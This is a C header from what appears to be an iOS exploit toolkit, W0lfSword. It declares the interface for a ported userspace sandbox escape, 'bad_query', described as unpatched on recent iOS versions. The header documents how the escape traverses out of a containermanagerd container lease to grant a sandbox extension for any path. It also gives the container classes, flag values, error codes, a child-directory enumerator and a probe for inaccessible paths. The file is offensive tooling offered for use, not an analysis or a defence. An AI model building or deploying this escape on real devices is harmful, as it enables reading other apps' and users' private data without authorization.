// bad_query_escape.h — userspace read-escape via containermanagerd traversal
//
// Port of Taj C's bad_query (https://github.com/tajc/bad_query — iOS 26.0–26.6.1
// / 27.0b4, UNPATCHED) for W0lfSword. Grants the calling process a consumed
// sandbox extension for an arbitrary path by path-traversing out of a container
// lease it can obtain (SystemGroup mobilegestaltcache, or a sacrificed App
// Group). No kernel exploit required — this is the 26.1+ userspace read escape.
//
// Implementation lives on the existing mcm_api dlopen bridge (kexploit/
// mcm_bridge.m) + sandbox_extension_consume/release resolved at runtime.
#ifndef bad_query_escape_h
#define bad_query_escape_h

#include <stdbool.h>
#include <stdint.h>

// Obtain a sandbox extension for `path` via the containermanagerd traversal.
//   path             — absolute path to escape to (e.g. "/var/mobile/Containers/Data/Application")
//   create           — false: path must already exist (lstat check)
//   group_identifier — NULL: SystemGroup route (class 13, mobilegestaltcache);
//                      otherwise: sacrifice this App Group identifier (class 7)
//   is_group         — iOS 26 App Group flag (0x800000000) vs SystemGroup (0x8000000000)
// Returns a consumed sandbox-extension handle (>= 0), or a negative error:
//   -255 not absolute · -254 missing (create=false) · -1 dlopen/resolve ·
//   -2 query create · -3 result denied (sandbox) · -4 token refused · -5 asprintf
int64_t bad_query_escape(const char *path, bool create,
                         const char *group_identifier, bool is_group);

// Release a handle returned by bad_query_escape.
void bad_query_release(int64_t handle);

// Enumerate DIRECT children of `path` via fsgetpath(2) — works even where the
// escape can't reach parent directories (still functional on 27.0b5+). Returns
// a malloc'd newline-separated list, or NULL. Caller frees.
char *bad_query_list(const char *path, int64_t max_inode);

// Probe: try the SystemGroup traversal against known-inaccessible paths and log
// exactly what opened. Returns true if any path became readable.
bool bad_query_probe(void);

#endif /* bad_query_escape_h */
